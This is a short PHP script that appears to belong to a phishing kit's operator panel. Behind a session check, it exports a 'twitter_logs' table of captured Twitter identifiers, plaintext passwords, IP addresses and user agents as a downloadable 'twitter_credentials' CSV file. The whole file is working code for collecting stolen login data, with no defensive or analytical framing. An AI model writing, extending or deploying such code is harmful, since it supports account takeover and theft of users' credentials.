<?php
include 'db.php';
session_start();
if (!isset($_SESSION['view_auth'])) {
    header("Location: view.php");
    exit;
}

$result = $conn->query("SELECT * FROM twitter_logs ORDER BY id DESC");

header('Content-Type: text/csv');
header('Content-Disposition: attachment; filename="twitter_credentials_' . date('Y-m-d') . '.csv"');

$output = fopen('php://output', 'w');
fputcsv($output, ['ID', 'Identifier', 'Password', 'IP', 'User Agent', 'Captured At']);

while ($row = $result->fetch_assoc()) {
    fputcsv($output, [$row['id'], $row['identifier'], $row['password'], $row['ip'], $row['user_agent'], $row['captured_at']]);
}
fclose($output);
?>